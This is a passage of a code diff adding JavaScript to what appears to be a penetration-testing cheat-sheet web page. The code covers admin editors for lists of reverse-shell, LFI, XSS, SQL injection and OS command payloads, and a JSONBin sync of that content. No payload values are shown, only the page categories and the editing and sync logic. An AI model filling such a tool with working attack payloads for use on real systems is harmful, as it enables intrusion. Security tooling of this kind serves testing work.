+  }
+}
+
+function initAllCmdPages(){
+  loadCmdData();
+  ['php','tty'].forEach(p=>renderCmdPage(p));
+  ['lfi','xss','sqli','linux','windows'].forEach(p=>renderCmdPage(p));
+}
+
+// ─── ADMIN CMD EDITORS ──────────────────────────────────────────────
+function buildCmdEditor(containerId, items, page, tab){
+  const el=document.getElementById(containerId);
+  if(!el) return;
+  el.innerHTML=items.map((it,i)=>`
+    <div class="ple-item" style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;">
+      <div class="ef" style="margin:0;"><label>label</label><input type="text" value="${escHtml(it.lbl)}" data-fi="${i}" data-fld="lbl" data-page="${page}" data-tab="${tab||''}"></div>
+      <div class="ef" style="margin:0;"><label>value / payload</label><input type="text" value="${escHtml(it.val)}" data-fi="${i}" data-fld="val" data-page="${page}" data-tab="${tab||''}"></div>
+      <button class="del-btn" onclick="deleteCmdItem('${page}','${tab||''}',${i})">del</button>
+    </div>`).join('');
+}
+
+function buildAllCmdEditors(){
+  // flat pages
+  buildCmdEditor('php-ple-list',CMD_DATA.php,'php','');
+  buildCmdEditor('tty-ple-list',CMD_DATA.tty,'tty','');
+  // tabbed pages
+  ['lfi','xss','sqli','linux','windows'].forEach(page=>{
+    Object.keys(CMD_TAB_DATA[page]).forEach(tab=>{
+      buildCmdEditor(`${page}-ple-${tab}`,CMD_TAB_DATA[page][tab],page,tab);
+    });
+  });
+}
+
+function collectCmdEditorItems(page, tab){
+  const selector=tab
+    ?`#${page}-ple-${tab} .ple-item input`
+    :`#${page}-ple-list .ple-item input`;
+  const inputs=document.querySelectorAll(selector);
+  const rows={};
+  inputs.forEach(inp=>{
+    const i=inp.dataset.fi;
+    const fld=inp.dataset.fld;
+    if(!rows[i]) rows[i]={lbl:'',val:''};
+    rows[i][fld]=inp.value;
+  });
+  return Object.values(rows);
+}
+
+function addCmdItem(page){
+  CMD_DATA[page].push({lbl:'label',val:'command'});
+  buildCmdEditor(`${page}-ple-list`,CMD_DATA[page],page,'');
+}
+function addCmdItemTab(page,tab){
+  CMD_TAB_DATA[page][tab].push({lbl:'label',val:'command'});
+  buildCmdEditor(`${page}-ple-${tab}`,CMD_TAB_DATA[page][tab],page,tab);
+}
+function deleteCmdItem(page,tab,i){
+  if(tab){CMD_TAB_DATA[page][tab].splice(i,1);buildCmdEditor(`${page}-ple-${tab}`,CMD_TAB_DATA[page][tab],page,tab);}
+  else{CMD_DATA[page].splice(i,1);buildCmdEditor(`${page}-ple-list`,CMD_DATA[page],page,'');}
+}
+function saveCmdPage(page){
+  CMD_DATA[page]=collectCmdEditorItems(page,'');
+  localStorage.setItem('nufyl_cmd_'+page,JSON.stringify(CMD_DATA[page]));
+  renderCmdPage(page);
+  flash(page+'-items');
+}
+function saveCmdPageTabs(page){
+  Object.keys(CMD_TAB_DATA[page]).forEach(tab=>{
+    CMD_TAB_DATA[page][tab]=collectCmdEditorItems(page,tab);
+  });
+  localStorage.setItem('nufyl_cmdtab_'+page,JSON.stringify(CMD_TAB_DATA[page]));
+  renderCmdPage(page);
+  flash(page+'-items');
+}
+
+
+// ═══════════════════════════════════════════════════════════════════
+// JSONBIN SYNC SYSTEM
+// ═══════════════════════════════════════════════════════════════════
+const JB_BASE = 'https://api.jsonbin.io/v3';
+
+function jbKey(){return localStorage.getItem('jb_apikey')||'';}
+function jbBin(){return localStorage.getItem('jb_binid')||'';}
+
+function setSyncDot(state){
+  // state: 'ok' | 'err' | 'busy' | 'off'
+  const dot=document.getElementById('sync-dot');
+  if(!dot)return;
+  const colors={ok:'#2dd4a0',err:'#f06060',busy:'#f5c542',off:'var(--border3)'};
+  const titles={ok:'synced with JSONBin',err:'JSONBin sync error',busy:'syncing...',off:'JSONBin not configured'};
+  dot.style.background=colors[state]||colors.off;
+  dot.title=titles[state]||'';
+}
+
+function jbStatus(msg,isErr){
+  const el=document.getElementById('jb-status');
+  if(el){el.textContent=msg;el.style.color=isErr?'var(--red)':'var(--green)';}
+}
+
+// Build the full config object from current state
+function buildConfigSnapshot(){
+  const snap={
+    v:2,
+    ts:Date.now(),
+    pageMeta:{},
+    homeDesc:localStorage.getItem('nufyl_home-desc')||'',
+    payloads:PAYLOADS,
+    cmdData:CMD_DATA,
+    cmdTabData:CMD_TAB_DATA,
+    icons:{},
+  };
+  ['shells','payloads','php','lfi','xss','sqli','linux','windows','encoding','msf','tty'].forEach(p=>{
+    snap.pageMeta[p]={
+      title:localStorage.getItem('nufyl_'+p+'_title')||'',
+      desc:localStorage.getItem('nufyl_'+p+'_desc')||'',
+    };
+  });
+  // icons (base64 data URLs — only include if set)
+  [  'shells','payloads','php','lfi','xss','sqli','linux','windows','encoding','msf','tty'].forEach(id=>{
+    const v=localStorage.getItem('icon_img_'+id);
+    if(v) snap.icons[id]=v;
+  });
+  return snap;
+}
+
+// Apply a config snapshot to the page and localStorage
+function applyConfigSnapshot(snap){
+  if(!snap||snap.v!==2) return false;
+  // home desc
+  if(snap.homeDesc!==undefined){
+    localStorage.setItem('nufyl_home-desc',snap.homeDesc);
+    const el=document.getElementById('home-desc');
+    if(el) el.textContent=snap.homeDesc;
+  }
+  // page metas
+  if(snap.pageMeta){
+    Object.entries(snap.pageMeta).forEach(([p,m])=>{
+      if(m.title){localStorage.setItem('nufyl_'+p+'_title',m.title);const el=document.getElementById(p+'-title');if(el)el.textContent=m.title;}
+      if(m.desc){localStorage.setItem('nufyl_'+p+'_desc',m.desc);const el=document.getElementById(p+'-desc');if(el)el.textContent=m.desc;}
+    });
+  }
+  // payloads
+  if(snap.payloads&&Array.isArray(snap.payloads)){
+    PAYLOADS=snap.payloads;
+    localStorage.setItem('nufyl_payloads',JSON.stringify(PAYLOADS));
+  }
+  // cmd data
+  if(snap.cmdData){
+    Object.assign(CMD_DATA,snap.cmdData);
+    Object.keys(CMD_DATA).forEach(p=>localStorage.setItem('nufyl_cmd_'+p,JSON.stringify(CMD_DATA[p])));
+  }
+  // cmd tab data
+  if(snap.cmdTabData){
+    Object.assign(CMD_TAB_DATA,snap.cmdTabData);
+    Object.keys(CMD_TAB_DATA).forEach(p=>localStorage.setItem('nufyl_cmdtab_'+p,JSON.stringify(CMD_TAB_DATA[p])));
+  }
+  // icons
+  if(snap.icons){
+    Object.entries(snap.icons).forEach(([id,url])=>{
+      localStorage.setItem('icon_img_'+id,url);
+      renderNavIcon(id);
+      renderCardIcon(id);
+    });
+  }
+  return true;
+}
+
+// PUSH current state to JSONBin
+async function pushToJb(silent){
+  const key=jbKey(),bin=jbBin();
+  if(!key||!bin){if(!silent)jbStatus('No credentials configured.',true);return false;}
+  setSyncDot('busy');
+  try{
+    const snap=buildConfigSnapshot();
+    const res=await fetch(`${JB_BASE}/b/${bin}`,{
+      method:'PUT',
+      headers:{'Content-Type':'application/json','X-Master-Key':key,'X-Bin-Versioning':'false'},
+      body:JSON.stringify(snap),
+    });
+    if(!res.ok) throw new Error(`HTTP ${res.status}`);
+    setSyncDot('ok');
+    if(!silent) jbStatus(`Pushed to JSONBin at ${new Date().toLocaleTimeString()}`);
+    return true;
+  }catch(e){
+    setSyncDot('err');
+    if(!silent) jbStatus('Push failed: '+e.message,true);
+    return false;
+  }
+}
+
+// PULL from JSONBin and apply
+async function pullFromJb(silent){
+  const key=jbKey(),bin=jbBin();
+  if(!key||!bin){setSyncDot('off');return false;}
+  setSyncDot('busy');
+  try{
+    const res=await fetch(`${JB_BASE}/b/${bin}/latest`,{
+      headers:{'X-Master-Key':key},
+    });
+    if(!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data=await res.json();
+    const snap=data.record;
+    const ok=applyConfigSnapshot(snap);
+    if(ok){
+      setSyncDot('ok');
+      if(!silent) jbStatus(`Pulled from JSONBin (saved ${snap.ts?new Date(snap.ts).toLocaleString():'unknown'})`);
+      // re-render everything
+      renderPayloads();
+      ['php','tty'].forEach(p=>renderCmdPage(p));
+      ['lfi','xss','sqli','linux','windows'].forEach(p=>renderCmdPage(p));
+      buildHomeGrid();
+      return true;
+    } else {
+      setSyncDot('err');
+      if(!silent) jbStatus('Pulled data but format was unexpected (v2 required).',true);
+      return false;
+    }
+  }catch(e){
+    setSyncDot('err');
+    if(!silent) jbStatus('Pull failed: '+e.message,true);
+    return false;
+  }
+}
+
+function saveJbCredentials(){
+  const k=document.getElementById('jb-apikey')?.value.trim();
+  const b=document.getElementById('jb-binid')?.value.trim();
+  if(!k||!b){jbStatus('Both API key and Bin ID are required.',true);return;}
+  localStorage.setItem('jb_apikey',k);
+  localStorage.setItem('jb_binid',b);
+  jbStatus('Credentials saved. Testing connection...');
+  testJbConnection();
+}
+function clearJbCredentials(){
+  localStorage.removeItem('jb_apikey');
+  localStorage.removeItem('jb_binid');
+  setSyncDot('off');
+  jbStatus('Credentials cleared.');
+  const ki=document.getElementById('jb-apikey');const bi=document.getElementById('jb-binid');
+  if(ki)ki.value='';if(bi)bi.value='';
+}
+async function testJbConnection(){
+  const key=jbKey(),bin=jbBin();
+  if(!key||!bin){jbStatus('No credentials. Enter API key and Bin ID first.',true);return;}
+  jbStatus('Testing...');
+  setSyncDot('busy');
+  try{
+    const res=await fetch(`${JB_BASE}/b/${bin}/latest`,{headers:{'X-Master-Key':key}});
+    if(res.status===200){setSyncDot('ok');jbStatus('Connection successful. Bin is readable.');}
+    else if(res.status===404){
+      // Bin exists but is empty — try creating initial content
+      jbStatus('Bin appears empty. Pushing initial config...');
+      const pushed=await pushToJb(true);
+      if(pushed) jbStatus('Initial config pushed. Sync is ready.');
+      else jbStatus('Could not push initial config. Check your API key.',true);
+    } else {throw new Error('HTTP '+res.status);}
+  }catch(e){setSyncDot('err');jbStatus('Connection failed: '+e.message+'. Check your API key and Bin ID.',true);}
+}
+
+function loadJbCredentialsIntoAdminUI(){
+  const ki=document.getElementById('jb-apikey');
+  const bi=document.getElementById('jb-binid');
+  if(ki) ki.value=jbKey();
+  if(bi) bi.value=jbBin();
+}
+
+// Auto-sync on page load
+async function jbAutoSync(){
+  if(!jbKey()||!jbBin()){setSyncDot('off');return;}
+  await pullFromJb(true);
+}
+
+// ─── PATCH: wrap all save functions to also push to JSONBin ──────────
+const _origSaveField=saveField;
+saveField=function(fieldId,inputId,flashId){
+  _origSaveField(fieldId,inputId,flashId);
+  pushToJb(true);
+};
+
+const _origSavePageMeta=savePageMeta;
+savePageMeta=function(page,flashId){
+  _origSavePageMeta(page,flashId);
+  pushToJb(true);
+};
+
+const _origSavePayloads=savePayloads;
+savePayloads=function(){
+  _origSavePayloads();
+  pushToJb(true);
+};
+
+const _origSaveCmdPage=saveCmdPage;
+saveCmdPage=function(page){
+  _origSaveCmdPage(page);
+  pushToJb(true);
+};
+
+const _origSaveCmdPageTabs=saveCmdPageTabs;
+saveCmdPageTabs=function(page){
+  _origSaveCmdPageTabs(page);
+  pushToJb(true);
+};
+
+const _origHandleIconUpload=handleIconUpload;
+handleIconUpload=function(id,input){
+  _origHandleIconUpload(id,input);
+  // icon upload is async — push after a short delay to let it finish
+  setTimeout(()=>pushToJb(true),300);
+};
+
+const _origClearIcon=clearIcon;
+clearIcon=function(id){
+  _origClearIcon(id);
+  pushToJb(true);
+};
+
 </script>
 </body>
 </html>
-ENDOFFILE
-echo "Done"
